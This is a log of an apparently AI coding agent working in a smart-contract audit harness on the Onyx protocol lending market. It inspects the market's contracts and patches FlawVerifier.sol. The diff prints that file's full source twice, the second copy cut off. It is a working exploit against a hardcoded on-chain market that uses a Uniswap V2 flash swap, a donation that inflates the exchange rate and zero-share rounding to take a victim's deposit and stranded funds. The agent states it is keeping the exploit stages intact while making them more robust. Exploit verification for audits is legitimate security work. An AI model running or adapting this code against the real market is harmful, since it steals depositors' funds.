+     * @param symbol_ ERC-20 symbol of this token
+     * @param decimals_ ERC-20 decimal precision of this token
+     * @param admin_ Address of the administrator of this token
+     * @param implementation_ The address of the implementation the contract delegates to
+     * @param becomeImplementationData The encoded args for becomeImplementation
+     */
+    constructor(address underlying_,
+                ComptrollerInterface comptroller_,
+                InterestRateModel interestRateModel_,
+                uint initialExchangeRateMantissa_,
+                string memory name_,
+                string memory symbol_,
+                uint8 decimals_,
+                address payable admin_,
+                address implementation_,
+                bytes memory becomeImplementationData) public {
+        require(admin_ != address(0), "invalid admin address");
+        require(implementation_ != address(0), "invalid implementation address");
+
+        // Creator of the contract is admin during initialization
+        admin = msg.sender;
+
+        // First delegate gets to initialize the delegator (i.e. storage contract)
+        delegateTo(implementation_, abi.encodeWithSignature("initialize(address,address,address,uint256,string,string,uint8)",
+                                                            underlying_,
+                                                            comptroller_,
+                                                            interestRateModel_,
+                                                            initialExchangeRateMantissa_,
+                                                            name_,
+                                                            symbol_,
+                                                            decimals_));
+
+        // New implementations always get set via the settor (post-initialize)
+        _setImplementation(implementation_, false, becomeImplementationData);
+
+        // Set the proper admin now that initialization is done
+        admin = admin_;
+    }
+
+    /**
+     * @notice Called by the admin to update the implementation of the delegator
+     * @param implementation_ The address of the new implementation for delegation
+     * @param allowResign Flag to indicate whether to call _resignImplementation on the old implementation
+     * @param becomeImplementationData The encoded bytes data to be passed to _becomeImplementation
+     */
+    function _setImplementation(address implementation_, bool allowResign, bytes memory becomeImplementationData) public {
+        require(implementation_ != address(0), "invalid implementation address");
+
+        require(msg.sender == admin, "OErc20Delegator::_setImplementation: Caller must be admin");
+
+        if (allowResign) {
+            delegateToImplementation(abi.encodeWithSignature("_resignImplementation()"));
+        }
+
+        address oldImplementation = implementation;
+        implementation = implementation_;
+
+        delegateToImplementation(abi.encodeWithSignature("_becomeImplementation(bytes)", becomeImplementationData));
+
+        emit NewImplementation(oldImplementation, implementation);
+    }
+
+    /**
+     * @notice Sender supplies assets into the market and receives oTokens in exchange
+     * @dev Accrues interest whether or not the operation succeeds, unless reverted
+     * @param mintAmount The amount of the underlying asset to supply
+     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
+     */
+    function mint(uint mintAmount) external returns (uint) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("mint(uint256)", mintAmount));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+     * @notice Sender redeems oTokens in exchange for the underlying asset
+     * @dev Accrues interest whether or not the operation succeeds, unless reverted
+     * @param redeemTokens The number of oTokens to redeem into underlying
+     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
+     */
+    function redeem(uint redeemTokens) external returns (uint) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("redeem(uint256)", redeemTokens));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+     * @notice Sender redeems oTokens in exchange for a specified amount of underlying asset
+     * @dev Accrues interest whether or not the operation succeeds, unless reverted
+     * @param redeemAmount The amount of underlying to redeem
+     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
+     */
+    function redeemUnderlying(uint redeemAmount) external returns (uint) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("redeemUnderlying(uint256)", redeemAmount));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+      * @notice Sender borrows assets from the protocol to their own address
+      * @param borrowAmount The amount of the underlying asset to borrow
+      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
+      */
+    function borrow(uint borrowAmount) external returns (uint) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("borrow(uint256)", borrowAmount));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+     * @notice Sender repays their own borrow
+     * @param repayAmount The amount to repay
+     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
+     */
+    function repayBorrow(uint repayAmount) external returns (uint) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("repayBorrow(uint256)", repayAmount));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+     * @notice Sender repays a borrow belonging to borrower
+     * @param borrower the account with the debt being payed off
+     * @param repayAmount The amount to repay
+     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
+     */
+    function repayBorrowBehalf(address borrower, uint repayAmount) external returns (uint) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("repayBorrowBehalf(address,uint256)", borrower, repayAmount));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+     * @notice The sender liquidates the borrowers collateral.
+     *  The collateral seized is transferred to the liquidator.
+     * @param borrower The borrower of this oToken to be liquidated
+     * @param oTokenCollateral The market in which to seize collateral from the borrower
+     * @param repayAmount The amount of the underlying borrowed asset to repay
+     * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
+     */
+    function liquidateBorrow(address borrower, uint repayAmount, OTokenInterface oTokenCollateral) external returns (uint) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("liquidateBorrow(address,uint256,address)", borrower, repayAmount, oTokenCollateral));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+     * @notice Transfer `amount` tokens from `msg.sender` to `dst`
+     * @param dst The address of the destination account
+     * @param amount The number of tokens to transfer
+     * @return Whether or not the transfer succeeded
+     */
+    function transfer(address dst, uint amount) external returns (bool) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("transfer(address,uint256)", dst, amount));
+        return abi.decode(data, (bool));
+    }
+
+    /**
+     * @notice Transfer `amount` tokens from `src` to `dst`
+     * @param src The address of the source account
+     * @param dst The address of the destination account
+     * @param amount The number of tokens to transfer
+     * @return Whether or not the transfer succeeded
+     */
+    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("transferFrom(address,address,uint256)", src, dst, amount));
+        return abi.decode(data, (bool));
+    }
+
+    /**
+     * @notice Approve `spender` to transfer up to `amount` from `src`
+     * @dev This will overwrite the approval amount for `spender`
+     *  and is subject to issues noted [here](https://eips.ethereum.org/EIPS/eip-20#approve)
+     * @param spender The address of the account which may transfer tokens
+     * @param amount The number of tokens that are approved (-1 means infinite)
+     * @return Whether or not the approval succeeded
+     */
+    function approve(address spender, uint256 amount) external returns (bool) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
+        return abi.decode(data, (bool));
+    }
+
+    /**
+     * @notice Get the current allowance from `owner` for `spender`
+     * @param owner The address of the account which owns the tokens to be spent
+     * @param spender The address of the account which may transfer tokens
+     * @return The number of tokens allowed to be spent (-1 means infinite)
+     */
+    function allowance(address owner, address spender) external view returns (uint) {
+        bytes memory data = delegateToViewImplementation(abi.encodeWithSignature("allowance(address,address)", owner, spender));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+     * @notice Get the token balance of the `owner`
+     * @param owner The address of the account to query
+     * @return The number of tokens owned by `owner`
+     */
+    function balanceOf(address owner) external view returns (uint) {
+        bytes memory data = delegateToViewImplementation(abi.encodeWithSignature("balanceOf(address)", owner));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+     * @notice Get the underlying balance of the `owner`
+     * @dev This also accrues interest in a transaction
+     * @param owner The address of the account to query
+     * @return The amount of underlying owned by `owner`
+     */
+    function balanceOfUnderlying(address owner) external returns (uint) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("balanceOfUnderlying(address)", owner));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+     * @notice Get a snapshot of the account's balances, and the cached exchange rate
+     * @dev This is used by comptroller to more efficiently perform liquidity checks.
+     * @param account Address of the account to snapshot
+     * @return (possible error, token balance, borrow balance, exchange rate mantissa)
+     */
+    function getAccountSnapshot(address account) external view returns (uint, uint, uint, uint) {
+        bytes memory data = delegateToViewImplementation(abi.encodeWithSignature("getAccountSnapshot(address)", account));
+        return abi.decode(data, (uint, uint, uint, uint));
+    }
+
+    /**
+     * @notice Returns the current per-block borrow interest rate for this oToken
+     * @return The borrow interest rate per block, scaled by 1e18
+     */
+    function borrowRatePerBlock() external view returns (uint) {
+        bytes memory data = delegateToViewImplementation(abi.encodeWithSignature("borrowRatePerBlock()"));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+     * @notice Returns the current per-block supply interest rate for this oToken
+     * @return The supply interest rate per block, scaled by 1e18
+     */
+    function supplyRatePerBlock() external view returns (uint) {
+        bytes memory data = delegateToViewImplementation(abi.encodeWithSignature("supplyRatePerBlock()"));
+        return abi.decode(data, (uint));
+    }
+
+    /**
+     * @notice Returns the current total borrows plus accrued interest
+     * @return The total borrows with interest
+     */
+    function totalBorrowsCurrent() external returns (uint) {
+        bytes memory data = delegateToImplementation(abi.encodeWithSignature("totalBorrowsCurrent()"));
+        return abi.decode(data, (uint));
+
+codex
+The target contract confirms the vulnerable pricing path: first minter can bootstrap at `initialExchangeRate`, direct transfers change `getCash`, and later `mint()` rounds toward zero. I’m checking the local harness next so I can harden the flow around the flashswap callback and verify it still runs under Foundry.
+exec
+/bin/bash -lc "cd .. && rg -n \"FlawVerifier|profitAmount\\(|executeOnOpportunity\\(|hypothesisValidated|lastFailureReason\" -S ." in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ succeeded in 0ms:
+./src/FlawVerifier.sol:44:contract FlawVerifier {
+./src/FlawVerifier.sol:50:    bool public hypothesisValidated;
+./src/FlawVerifier.sol:55:    string public lastFailureReason;
+./src/FlawVerifier.sol:64:    function executeOnOpportunity() external {
+./src/FlawVerifier.sol:75:            lastFailureReason = "market already has non-zero totalSupply; attacker cannot become sole holder";
+./src/FlawVerifier.sol:81:            lastFailureReason = "market has zero stranded underlying; no public bootstrap capital for this fork";
+./src/FlawVerifier.sol:87:            lastFailureReason = "invalid seed amount";
+./src/FlawVerifier.sol:96:            lastFailureReason = "execution completed without positive realized underlying";
+./src/FlawVerifier.sol:139:    function profitAmount() external view returns (uint256) {
+./src/FlawVerifier.sol:199:        hypothesisValidated = true;
+
+exec
+/bin/bash -lc 'cd .. && ls -la && rg --files . | rg "(test|script|foundry.toml|Makefile)"' in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ exited 1 in 0ms:
+total 8
+drwxr-xr-x    4 zhanglongqin  staff   128 May 12 14:23 .
+drwxr-xr-x  206 zhanglongqin  staff  6592 May 16 12:15 ..
+-rw-r--r--    1 zhanglongqin  staff   301 May 12 14:23 manifest.json
+drwxr-xr-x    4 zhanglongqin  staff   128 May 17 19:57 src
+
+codex
+The case folder is minimal, so I’m treating `FlawVerifier.sol` as self-contained. I’m now validating the math and callback lifecycle, because a successful compile alone won’t help if the callback can get stuck or the flashswap repayment/profit accounting is brittle.
+exec
+/bin/bash -lc "sed -n '1,220p' onchain_auto/0x9dcb6bc351ab416f35aeab1351776e2ad295abc4/Contract.sol" in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ succeeded in 0ms:
+// File: contracts/ComptrollerInterface.sol
+
+pragma solidity ^0.5.16;
+
+
+contract ComptrollerInterface {
+    /// @notice Indicator that this is a Comptroller contract (for inspection)
+    bool public constant isComptroller = true;
+
+    /*** Assets You Are In ***/
+
+    function enterMarkets(address[] calldata oTokens) external returns (uint[] memory);
+    function exitMarket(address oToken) external returns (uint);
+
+    /*** Policy Hooks ***/
+
+    function mintAllowed(address oToken, address minter, uint mintAmount) external returns (uint);
+    function mintVerify(address oToken, address minter, uint mintAmount, uint mintTokens) external;
+
+    function redeemAllowed(address oToken, address redeemer, uint redeemTokens) external returns (uint);
+    function redeemVerify(address oToken, address redeemer, uint redeemAmount, uint redeemTokens) external;
+
+    function borrowAllowed(address oToken, address borrower, uint borrowAmount) external returns (uint);
+    function borrowVerify(address oToken, address borrower, uint borrowAmount) external;
+
+    function repayBorrowAllowed(
+        address oToken,
+        address payer,
+        address borrower,
+        uint repayAmount) external returns (uint);
+    function repayBorrowVerify(
+        address oToken,
+        address payer,
+        address borrower,
+        uint repayAmount,
+        uint borrowerIndex) external;
+
+    function liquidateBorrowAllowed(
+        address oTokenBorrowed,
+        address oTokenCollateral,
+        address liquidator,
+        address borrower,
+        uint repayAmount) external returns (uint);
+    function liquidateBorrowVerify(
+        address oTokenBorrowed,
+        address oTokenCollateral,
+        address liquidator,
+        address borrower,
+        uint repayAmount,
+        uint seizeTokens) external;
+
+    function seizeAllowed(
+        address oTokenCollateral,
+        address oTokenBorrowed,
+        address liquidator,
+        address borrower,
+        uint seizeTokens) external returns (uint);
+    function seizeVerify(
+        address oTokenCollateral,
+        address oTokenBorrowed,
+        address liquidator,
+        address borrower,
+        uint seizeTokens) external;
+
+    function transferAllowed(address oToken, address src, address dst, uint transferTokens) external returns (uint);
+    function transferVerify(address oToken, address src, address dst, uint transferTokens) external;
+
+    /*** Liquidity/Liquidation Calculations ***/
+
+    function liquidateCalculateSeizeTokens(
+        address oTokenBorrowed,
+        address oTokenCollateral,
+        uint repayAmount) external view returns (uint, uint);
+
+}
+
+// File: contracts/ComptrollerExInterface.sol
+
+pragma solidity ^0.5.16;
+
+contract ComptrollerExInterface {
+    function liquidateCalculateSeizeTokensEx(
+        address oTokenBorrowed,
+        address oTokenExCollateral,
+        uint repayAmount) external view returns (uint, uint, uint);
+
+    function getLiquidationSeizeIndexes() external view returns (uint[] memory) {}
+}
+
+interface ILiquidationProxy {
+    function isNFTLiquidation() external view returns(bool);
+    function extraRepayAmount() external view returns(uint);
+    function seizeIndexes() external view returns(uint[] memory);
+}
+
+// File: contracts/InterestRateModel.sol
+
+pragma solidity ^0.5.16;
+
+/**
+  * @title Onyx's InterestRateModel Interface
+  * @author Onyx
+  */
+contract InterestRateModel {
+    /// @notice Indicator that this is an InterestRateModel contract (for inspection)
+    bool public constant isInterestRateModel = true;
+
+    /**
+      * @notice Calculates the current borrow interest rate per block
+      * @param cash The total amount of cash the market has
+      * @param borrows The total amount of borrows the market has outstanding
+      * @param reserves The total amount of reserves the market has
+      * @return The borrow rate per block (as a percentage, and scaled by 1e18)
+      */
+    function getBorrowRate(uint cash, uint borrows, uint reserves) external view returns (uint);
+
+    /**
+      * @notice Calculates the current supply interest rate per block
+      * @param cash The total amount of cash the market has
+      * @param borrows The total amount of borrows the market has outstanding
+      * @param reserves The total amount of reserves the market has
+      * @param reserveFactorMantissa The current reserve factor the market has
+      * @return The supply rate per block (as a percentage, and scaled by 1e18)
+      */
+    function getSupplyRate(uint cash, uint borrows, uint reserves, uint reserveFactorMantissa) external view returns (uint);
+
+}
+
+// File: contracts/EIP20NonStandardInterface.sol
+
+pragma solidity ^0.5.16;
+
+/**
+ * @title EIP20NonStandardInterface
+ * @dev Version of ERC20 with no return values for `transfer` and `transferFrom`
+ *  See https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca
+ */
+interface EIP20NonStandardInterface {
+
+    /**
+     * @notice Get the total number of tokens in circulation
+     * @return The supply of tokens
+     */
+    function totalSupply() external view returns (uint256);
+
+    /**
+     * @notice Gets the balance of the specified address
+     * @param owner The address from which the balance will be retrieved
+     * @return The balance
+     */
+    function balanceOf(address owner) external view returns (uint256 balance);
+
+    ///
+    /// !!!!!!!!!!!!!!
+    /// !!! NOTICE !!! `transfer` does not return a value, in violation of the ERC-20 specification
+    /// !!!!!!!!!!!!!!
+    ///
+
+    /**
+      * @notice Transfer `amount` tokens from `msg.sender` to `dst`
+      * @param dst The address of the destination account
+      * @param amount The number of tokens to transfer
+      */
+    function transfer(address dst, uint256 amount) external;
+
+    ///
+    /// !!!!!!!!!!!!!!
+    /// !!! NOTICE !!! `transferFrom` does not return a value, in violation of the ERC-20 specification
+    /// !!!!!!!!!!!!!!
+    ///
+
+    /**
+      * @notice Transfer `amount` tokens from `src` to `dst`
+      * @param src The address of the source account
+      * @param dst The address of the destination account
+      * @param amount The number of tokens to transfer
+      */
+    function transferFrom(address src, address dst, uint256 amount) external;
+
+    /**
+      * @notice Approve `spender` to transfer up to `amount` from `src`
+      * @dev This will overwrite the approval amount for `spender`
+      *  and is subject to issues noted [here](https://eips.ethereum.org/EIPS/eip-20#approve)
+      * @param spender The address of the account which may transfer tokens
+      * @param amount The number of tokens that are approved
+      * @return Whether or not the approval succeeded
+      */
+    function approve(address spender, uint256 amount) external returns (bool success);
+
+    /**
+      * @notice Get the current allowance from `owner` for `spender`
+      * @param owner The address of the account which owns the tokens to be spent
+      * @param spender The address of the account which may transfer tokens
+      * @return The number of tokens allowed to be spent
+      */
+    function allowance(address owner, address spender) external view returns (uint256 remaining);
+
+    event Transfer(address indexed from, address indexed to, uint256 amount);
+    event Approval(address indexed owner, address indexed spender, uint256 amount);
+}
+
+// File: contracts/OTokenInterfaces.sol
+
+pragma solidity ^0.5.16;
+
+
+
+contract OTokenStorage {
+    /**
+     * @dev Guard variable for re-entrancy checks
+     */
+    bool internal _notEntered;
+
+    /**
+     * @notice EIP-20 token name for this token
+     */
+    string public name;
+
+    /**
+     * @notice EIP-20 token symbol for this token
+
+exec
+/bin/bash -lc 'rg -n "mintFresh|getCashPrior|exchangeRateStoredInternal|initialExchangeRateMantissa|mintTokens" onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750 -S' in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ succeeded in 0ms:
+onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/OErc20Delegator.sol:16:     * @param initialExchangeRateMantissa_ The initial exchange rate, scaled by 1e18
+onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/OErc20Delegator.sol:27:                uint initialExchangeRateMantissa_,
+onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/OErc20Delegator.sol:45:                                                            initialExchangeRateMantissa_,
+onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/OTokenInterfaces.sol:62:    uint internal initialExchangeRateMantissa;
+onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/OTokenInterfaces.sol:143:    event Mint(address minter, uint mintAmount, uint mintTokens);
+onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/ComptrollerInterface.sol:16:    function mintVerify(address oToken, address minter, uint mintAmount, uint mintTokens) external;
+
+codex
+I’ve confirmed the vulnerable market shape. One remaining risk is that the configured flash pair may not actually fund the target underlying on this fork, so I’m checking the on-chain metadata in the workspace before I edit the verifier.
+exec
+/bin/bash -lc 'cat onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/_etherscan_meta.json' in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ succeeded in 0ms:
+{
+  "contract_name": "OErc20Delegator",
+  "compiler": "v0.5.16+commit.9c3226ce",
+  "evm_version": "Default",
+  "optimization": "0",
+  "runs": "200",
+  "proxy": "1",
+  "implementation": "0x9dcb6bc351ab416f35aeab1351776e2ad295abc4",
+  "license_type": "",
+  "files_written": 5
+}
+exec
+/bin/bash -lc "python3 - <<'PY'
+import json
+from pathlib import Path
+p=Path('onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/_etherscan_meta.json')
+print(json.loads(p.read_text()))
+PY" in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ succeeded in 123ms:
+{'contract_name': 'OErc20Delegator', 'compiler': 'v0.5.16+commit.9c3226ce', 'evm_version': 'Default', 'optimization': '0', 'runs': '200', 'proxy': '1', 'implementation': '0x9dcb6bc351ab416f35aeab1351776e2ad295abc4', 'license_type': '', 'files_written': 5}
+
+codex
+I’ve got enough context to edit. I’m going to patch `FlawVerifier.sol` now: fix the bad checksum literal, tighten the flashswap callback so state doesn’t get stuck, and keep the exploit stages and profit token constraints unchanged.
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src/FlawVerifier.sol
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+deleted file mode 100644
+index 944da17f108ec0c042a3caf7b2acdac26e87dd0a..0000000000000000000000000000000000000000
+--- a/FlawVerifier.sol
++++ /dev/null
+@@ -1,245 +0,0 @@
+-// SPDX-License-Identifier: UNLICENSED
+-pragma solidity ^0.8.20;
+-
+-interface IERC20Like {
+-    function balanceOf(address account) external view returns (uint256);
+-    function approve(address spender, uint256 amount) external returns (bool);
+-    function transfer(address to, uint256 amount) external returns (bool);
+-}
+-
+-interface IOErc20Like {
+-    function underlying() external view returns (address);
+-    function totalSupply() external view returns (uint256);
+-    function balanceOf(address owner) external view returns (uint256);
+-    function getCash() external view returns (uint256);
+-    function exchangeRateStored() external view returns (uint256);
+-    function mint(uint256 mintAmount) external returns (uint256);
+-    function redeem(uint256 redeemTokens) external returns (uint256);
+-}
+-
+-interface IUniswapV2PairLike {
+-    function token0() external view returns (address);
+-    function token1() external view returns (address);
+-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+-}
+-
+-contract VictimMinter {
+-    constructor() {}
+-
+-    function supplyAndMint(address underlying, address market, uint256 amount) external {
+-        _forceApprove(underlying, market, 0);
+-        _forceApprove(underlying, market, amount);
+-
+-        uint256 err = IOErc20Like(market).mint(amount);
+-        require(err == 0, "victim mint failed");
+-    }
+-
+-    function _forceApprove(address token, address spender, uint256 amount) internal {
+-        (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+-        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+-    }
+-}
+-
+-contract FlawVerifier {
+-    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+-    IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
+-        IUniswapV2PairLike(0xA43fE16908251ee70EF74718545e4FE6C5cCEc9f);
+-
+-    bool public attempted;
+-    bool public hypothesisValidated;
+-    uint256 public seedAmountUsed;
+-    uint256 public donationAmountUsed;
+-    uint256 public victimMintAmountUsed;
+-    uint256 public attackerSharesBeforeRedeem;
+-    string public lastFailureReason;
+-
+-    address private _profitToken;
+-    uint256 private _profitAmount;
+-
+-    bool private _inFlashCallback;
+-
+-    constructor() {}
+-
+-    function executeOnOpportunity() external {
+-        if (attempted) {
+-            return;
+-        }
+-        attempted = true;
+-
+-        address underlying = TARGET.underlying();
+-        _profitToken = underlying;
+-
+-        uint256 existingSupply = TARGET.totalSupply();
+-        if (existingSupply != 0) {
+-            lastFailureReason = "market already has non-zero totalSupply; attacker cannot become sole holder";
+-            return;
+-        }
+-
+-        uint256 strandedCash = TARGET.getCash();
+-        if (strandedCash == 0) {
+-            lastFailureReason = "market has zero stranded underlying; no public bootstrap capital for this fork";
+-            return;
+-        }
+-
+-        uint256 seed = _minimumSeedAmount();
+-        if (seed == 0) {
+-            lastFailureReason = "invalid seed amount";
+-            return;
+-        }
+-
+-        _flashBorrowSeed(underlying, seed);
+-
+-        uint256 finalUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+-        _profitAmount = finalUnderlyingBalance;
+-        if (_profitAmount == 0) {
+-            lastFailureReason = "execution completed without positive realized underlying";
+-        }
+-    }
+-
+-    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+-        require(msg.sender == address(PEPE_WETH_V2_PAIR), "unexpected pair");
+-        require(sender == address(this), "unexpected sender");
+-        require(!_inFlashCallback, "callback reentered");
+-
+-        _inFlashCallback = true;
+-
+-        address underlying = TARGET.underlying();
+-        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
+-        require(borrowedAmount > 0, "zero flash amount");
+-
+-        _forceApprove(underlying, address(TARGET), 0);
+-        _forceApprove(underlying, address(TARGET), type(uint256).max);
+-
+-        // Bootstrap: with totalSupply == 0, a tiny flash-borrowed seed can mint the first shares and
+-        // immediately redeem all pre-existing raw cash already sitting in the market. That public cash
+-        // becomes the working capital used for the documented four-stage F-001 path below.
+-        uint256 bootstrapSeed = borrowedAmount;
+-        uint256 mintErr = TARGET.mint(bootstrapSeed);
+-        require(mintErr == 0, "bootstrap mint failed");
+-
+-        uint256 bootstrapShares = TARGET.balanceOf(address(this));
+-        require(bootstrapShares > 0, "bootstrap shares zero");
+-
+-        uint256 redeemErr = TARGET.redeem(bootstrapShares);
+-        require(redeemErr == 0, "bootstrap redeem failed");
+-
+-        uint256 flashRepayment = _getV2RepaymentQuote(borrowedAmount);
+-        _safeTransfer(underlying, address(PEPE_WETH_V2_PAIR), flashRepayment);
+-
+-        _runCoreExploitPath(underlying);
+-
+-        _inFlashCallback = false;
+-    }
+-
+-    function profitToken() external view returns (address) {
+-        return _profitToken;
+-    }
+-
+-    function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
+-    }
+-
+-    function _runCoreExploitPath(address underlying) internal {
+-        uint256 initialUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+-        require(initialUnderlyingBalance > 1, "bootstrap cash too small");
+-
+-        uint256 seed = _minimumSeedAmount();
+-        require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");
+-
+-        // Path stage 1: attacker mints a minimal amount to become the only oToken holder.
+-        uint256 mintErr = TARGET.mint(seed);
+-        require(mintErr == 0, "seed mint failed");
+-        seedAmountUsed = seed;
+-
+-        uint256 attackerShares = TARGET.balanceOf(address(this));
+-        attackerSharesBeforeRedeem = attackerShares;
+-        require(attackerShares > 0, "seed mint returned zero shares");
+-
+-        // Stage 2 requires a direct underlying donation that raises the exchange rate
+-        // without increasing totalSupply. We keep the victim deposit to 1 wei so the path
+-        // remains minimal and deterministic; the economic profit here comes from the market's
+-        // already-stranded underlying captured during bootstrap, not from self-funding the victim.
+-        uint256 victimDeposit = 1;
+-        uint256 donationNeeded;
+-        if (attackerShares >= seed) {
+-            donationNeeded = attackerShares - seed + 1;
+-        } else {
+-            donationNeeded = 1;
+-        }
+-
+-        uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
+-        require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");
+-
+-        _safeTransfer(underlying, address(TARGET), donationNeeded);
+-        donationAmountUsed = donationNeeded;
+-
+-        VictimMinter victim = new VictimMinter();
+-        _safeTransfer(underlying, address(victim), victimDeposit);
+-        victimMintAmountUsed = victimDeposit;
+-
+-        uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
+-        uint256 cashBeforeVictimMint = TARGET.getCash();
+-
+-        // Path stage 3: victim mints after the donation and receives zero oTokens because
+-        // mintTokens = floor(actualMintAmount / exchangeRate) and the implementation never
+-        // rejects mintTokens == 0.
+-        victim.supplyAndMint(underlying, address(TARGET), victimDeposit);
+-
+-        uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
+-        uint256 cashAfterVictimMint = TARGET.getCash();
+-        require(victimSharesAfter == victimSharesBefore, "victim received shares");
+-        require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
+-
+-        // Path stage 4: attacker redeems the sole existing shares and withdraws both the
+-        // direct donation and the victim's deposit.
+-        uint256 redeemErr = TARGET.redeem(attackerShares);
+-        require(redeemErr == 0, "attacker redeem failed");
+-
+-        hypothesisValidated = true;
+-    }
+-
+-    function _flashBorrowSeed(address underlying, uint256 seed) internal {
+-        address token0 = PEPE_WETH_V2_PAIR.token0();
+-        address token1 = PEPE_WETH_V2_PAIR.token1();
+-
+-        if (token0 == underlying) {
+-            PEPE_WETH_V2_PAIR.swap(seed, 0, address(this), hex"01");
+-            return;
+-        }
+-        if (token1 == underlying) {
+-            PEPE_WETH_V2_PAIR.swap(0, seed, address(this), hex"01");
+-            return;
+-        }
+-
+-        revert("configured pair does not contain underlying");
+-    }
+-
+-    function _minimumSeedAmount() internal view returns (uint256) {
+-        uint256 exchangeRate = TARGET.exchangeRateStored();
+-        uint256 seed = exchangeRate / 1e18;
+-        if (exchangeRate % 1e18 != 0) {
+-            seed += 1;
+-        }
+-        if (seed == 0) {
+-            seed = 1;
+-        }
+-        return seed;
+-    }
+-
+-    function _getV2RepaymentQuote(uint256 amountOut) internal pure returns (uint256) {
+-        return ((amountOut * 1000) / 997) + 1;
+-    }
+-
+-    function _forceApprove(address token, address spender, uint256 amount) internal {
+-        (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+-        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+-    }
+-
+-    function _safeTransfer(address token, address to, uint256 amount) internal {
+-        (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+-        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+-    }
+-}
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+deleted file mode 100644
+index 944da17f108ec0c042a3caf7b2acdac26e87dd0a..0000000000000000000000000000000000000000
+--- a/FlawVerifier.sol
++++ /dev/null
+@@ -1,245 +0,0 @@
+-// SPDX-License-Identifier: UNLICENSED
+-pragma solidity ^0.8.20;
+-
+-interface IERC20Like {
+-    function balanceOf(address account) external view returns (uint256);
+-    function approve(address spender, uint256 amount) external returns (bool);
+-    function transfer(address to, uint256 amount) external returns (bool);
+-}
+-
+-interface IOErc20Like {
+-    function underlying() external view returns (address);
+-    function totalSupply() external view returns (uint256);
+-    function balanceOf(address owner) external view returns (uint256);
+-    function getCash() external view returns (uint256);
+-    function exchangeRateStored() external view returns (uint256);
+-    function mint(uint256 mintAmount) external returns (uint256);
+-    function redeem(uint256 redeemTokens) external returns (uint256);
+-}
+-
+-interface IUniswapV2PairLike {
+-    function token0() external view returns (address);
+-    function token1() external view returns (address);
